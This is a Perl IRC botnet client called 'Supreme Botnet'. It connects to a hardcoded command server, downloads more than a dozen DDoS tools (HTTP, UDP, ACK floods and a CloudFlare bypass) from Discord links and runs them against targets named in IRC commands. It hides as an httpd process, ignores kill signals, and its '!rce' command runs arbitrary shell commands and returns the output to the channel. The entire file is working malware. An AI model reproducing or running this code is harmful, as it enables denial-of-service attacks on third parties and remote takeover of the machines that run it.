#!usr/bin/perl

      #######################################################################
      ##                                                                   ##
      ##                  CONFIGURATIONS OF SUPREME BOTNET                 ##
      ##                                                                   ##
      #######################################################################
	  
use IO::Socket;
my $processo = '/usr/sbin/httpd';
my $server  = "164.68.101.200"; 
my $code = int(rand(999999));
my $channel = "#computer";
my $port    =   "6667";
my $nick    = "[Warnight]-[$code]";

      #######################################################################
      ##                                                                   ##
      ##              DOWNLOAD DDoS METHODS OF SUPREME BOTNET              ##
      ##                                                                   ##
      #######################################################################

unless (-e "httptest.py") {
  print "[*] Instalando o HTTP-TEST...";
  system("wget https://cdn.discordapp.com/attachments/530891110500007946/597886406760726539/http.py -O httptest.py");
}
 
unless (-e "bty.pl") {
  print "[*] Install the AWP-ATTACK...";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050027951718413/bty.pl -O bty.pl");
}
 
unless (-e "proxys.txt") {
  print "[*] Install the Proxies...";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/604533160990081025/proxys.txt -O proxys.txt");
}
 
unless (-e "cfbypass2.py") {
  print "[*] Instalando o HTTPS CloudFlare Protection Bypass...";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050127029829678/cfbypass2.py -O cfbypass2.py");
}
 
unless (-e "cfbypass.py") {
  print "[*] Instalando o HTTP CloudFlare Protection Bypass...";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599791578210500617/cfbypass.py -O cfbypass.py");
}
 
unless (-e "sadattack.py") {
  print "[*] Instalando o SADATTACK...";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050011279360000/sadattack.py -O sadattack.py");
}
 
unless (-e "hulk.py") {
  print "[*] Instalando o HULK... ";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050007957471341/hulk.py -O hulk.py");
}
 
unless (-e "goldeneye.py") {
  print "[*] Instalando o Goldeneye... ";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599049992119779347/goldeneye.py -O goldeneye.py");
}
 
unless (-e "std.c") {
  print "[*] Instalando STD... ";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599075938667593730/std.c -O std.c");
  system("gcc std.c -o std -pthread");
}
 
unless (-e "httpattack.pl") {
  print "[*] Instalando HTTP-ATTACK... ";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050008490147850/httpattack.pl -O httpattack.pl");
}
 
unless (-e "udp1.pl") {
  print "[*] Instalando UDP-1... ";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050013561192467/udp1.pl -O udp1.pl");
}
 
unless (-e "udp2.pl") {
  print "[*] Instalando UDP-2... ";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050022092406814/udp2.pl -O udp2.pl");
}
 
unless (-e "udp3.pl") {
  print "[*] Install the UDP-3... ";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050023136788480/udp3.pl -O udp3.pl");
}
 
unless (-e "ack.pl") {
  print "[*] Instalando ACK-Attack... ";
  system("wget https://cdn.discordapp.com/attachments/581383689427091457/599050026353688596/ack.pl -O ack.pl");
}

all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

print "Botnet on and working normally. Your bots are being uploaded.\n\n";
while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";
      }
      
      #######################################################################
      ##                                                                   ##
      ##                ALL NOHUP COMMANDS OF FUCKING BOTNET               ##
      ##                                                                   ##
      #######################################################################
      
      if ( $log =~ m/:!htpptest (.*)$/g ){##########
        my $target_httptest = $1;
        $target_httptest =~ s/^\s*(.*?)\s*$/$1/;
        $target_httptest;
        print $s0ck3t "PRIVMSG $channel :67[63HTTP-TEST67]61 Mass DDoS Attack on target: $1 o\r\n";
        system("nohup python httptest.py $target_httptest 80 > /dev/null 2>&1 &");
      }
	  
      if ( $log =~ m/:!awp (.*)$/g ){##########
        my $target_awp = $1;
        $target_awp =~ s/^\s*(.*?)\s*$/$1/;
        $target_awp;
        print $s0ck3t "PRIVMSG $channel :67[63AWP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl bty.pl $target_awp 400 800 proxys.txt> /dev/null 2>&1 &");
      }
	  
      if ( $log =~ m/:!cfbypass (.*)$/g ){##########
        my $target_cfbypass = $1;
        $target_cfbypass =~ s/^\s*(.*?)\s*$/$1/;
        $target_cfbypass;
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python cfbypass.py $target_cfbypass > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!cfbypass2 (.*)$/g ){##########
        my $target_cfbypass2 = $1;
        $target_cfbypass2 =~ s/^\s*(.*?)\s*$/$1/;
        $target_cfbypass2;
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python cfbypass2.py $target_cfbypass2 > /dev/null 2>&1 &");
      }
	 
	  if ( $log =~ m/:!sadattack (.*)$/g ){##########
        my $target_sadattack = $1;
        $target_sadattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_sadattack;
        print $s0ck3t "PRIVMSG $channel :67[63SAD-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python sadattack.py $target_sadattack > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $s0ck3t "PRIVMSG $channel :67[63HULK-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!gold (.*)$/g ){##########
        my $target_gold = $1;
        $target_gold =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :67[63GOLD-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python goldeneye.py $target_gold -w 25 -s 800 > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!std (.*)$/g ){##########
        my $target_std = $1;
        my $port_std = $2;
        my $time_std = $3;
        print $s0ck3t "PRIVMSG $channel :67[63STD67]61 Mass DDoS Attack  on target: $1 \r\n";
        system("nohup ./std $target_std $port_std $time_std > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!httpattack (.*)$/g ){##########
        my $target_httpattack = $1;
        $target_httpattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_httpattack;
        print $s0ck3t "PRIVMSG $channel :67[63HTTP-ATTACK67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl httpattack.pl $target_httpattack 1000 100 GET 13.37 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!ack (.*)$/g ){##########
        my $target_ack = $1;
        my $time_ack = $2;
        print $s0ck3t "PRIVMSG $channel :4ACK-ATTACK4 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl ack.pl $target_ack 4800 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!udp (.*)$/g ){##########
        my $target_udp = $1;
        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl udp1.pl $target_udp > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!udp2 (.*)$/g ){##########
        my $target_udp2 = $1;
        my $time_udp2 = $2;
        print $s0ck3t "PRIVMSG $channel :67[63UDP_v267]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl udp2.pl $target_udp2 4800 > /dev/null 2>&1 &");
	  }
	  
	  if ( $log =~ m/:!udp3 (.*)$/g ){##########
        my $target_udp3 = $1;
        my $time_udp3 = $2;
        print $s0ck3t "PRIVMSG $channel :67[63UDP_v367]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl udp3.pl $target_udp3 4800 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!spoof (.*)$/g ){##########
	    my $target_perl = $1;
        print $s0ck3t "PRIVMSG $channel :67[63Bots Uploader67]61 You have requested more bots, your bots $1 are being sent. \r\n";
        system("nohup $target_perl infect.pl > /dev/null 2>&1 &");
		system("nohup $target_perl infect.pl > /dev/null 2>&1 &");
      }
	  
      #######################################################################
      ##                                                                   ##
      ##                 SPECIALS ATTACKS OF SUPREME BOTNET                ##
      ##                                                                   ##
      #######################################################################
	  
	  if ( $log =~ m/:!layer4 (.*)$/g ){##########
        my $target_layer4 = $1;
        print $s0ck3t "PRIVMSG $channel :67[63Layer467]61 Mass DDoS Attack on target: $1 \r\n";
		system("nohup perl udp1.pl $target_layer4 > /dev/null 2>&1 &");
		system("nohup perl udp2.pl $target_layer4 4800 > /dev/null 2>&1 &");
		system("nohup perl udp3.pl $target_layer4 4800 > /dev/null 2>&1 &");
		system("nohup perl ack.pl $target_layer4 4800 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!layer7 (.*)$/g ){##########
        my $target_layer7 = $1;
        $target_layer7 =~ s/^\s*(.*?)\s*$/$1/;
        $target_layer7;
        print $s0ck3t "PRIVMSG $channel :67[63Layer767]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl httpattack.pl $target_layer7 1000 100 GET 13.37 > /dev/null 2>&1 &");
		system("nohup python goldeneye.py $target_layer7 -w 15 -s 650 > /dev/null 2>&1 &");
		system("nohup python sadattack.py $target_layer7 > /dev/null 2>&1 &");
		system("nohup python cfbypass.py $target_layer7 > /dev/null 2>&1 &");
      }
      
      #######################################################################
      ##                                                                   ##
      ##                 STOP  ALL ATTACKS OF FUCKING BOTNET               ##
      ##                                                                   ##
      #######################################################################
      
      if ( $log =~ m/:!stopall/g ){##########
	    print $s0ck3t "PRIVMSG $channel :67[63STOP67]61 Stopping all attacks... \r\n";
		system("pkill -9 -f bty");
        system("pkill -9 -f cfbypass");
		system("pkill -9 -f cfbypass2");
        system("pkill -9 -f goldeneye");
		system("pkill -9 -f httpattack");
		system("pkill -9 -f httptest");
        system("pkill -9 -f sadattack");
        system("pkill -9 -f hulk");
        system("pkill -9 -f std");
   		system("pkill -9 -f ack");
	    system("pkill -9 -f udp1");
        system("pkill -9 -f udp2");
		system("pkill -9 -f udp3");
      }
	  
	  if ( $log =~ m/:!kill/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63KILL67]61 Killing all the bots... \r\n";
        system("pkill -9 -f cfbypass");
		system("pkill -9 -f cfbypass2");
        system("pkill -9 -f goldeneye");
		system("pkill -9 -f httpattack");
        system("pkill -9 -f sadattack");
        system("pkill -9 -f hulk");
        system("pkill -9 -f std");
   		system("pkill -9 -f ack");
	    system("pkill -9 -f udp1");
        system("pkill -9 -f udp2");
		system("pkill -9 -f udp3");
		system("pkill -9 -f httptest");
		system("pkill -9 -f http");
      }
	  
      #######################################################################
      ##                                                                   ##
      ##                    ALL COMMANDS OF FUCKING BOTNET                 ##
      ##                                                                   ##
      #######################################################################
     
     if ( $log =~ m/:!help/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63Help67]61 Layer4 commands:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !udp Target-IP (There are 2 and 3 too.)\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !std Target-IP Port Time\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !layer4 Target-IP (Em testes e somente para maquinas fortes)\r\n";
        print $s0ck3t "PRIVMSG $channel :67\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Help67]61 Layer7 commands:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !hulk http://target.com\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !gold http://target.com\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !http http://target.com\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !sadattack http://target.com\r\n";
	    print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !cfbypass http://target.com (HTTP)\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !cfbypass2 https://target.com (HTTPS)\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !layer7 http://target.com (Em testes e somente para maquinas fortes)\r\n";
      }


      if ( $log =~ m/:!rce (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);
		
        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :4RCE4 Output67 => $comando_each \r\n";
       }
   }
}
}
while(true){
  all();
}
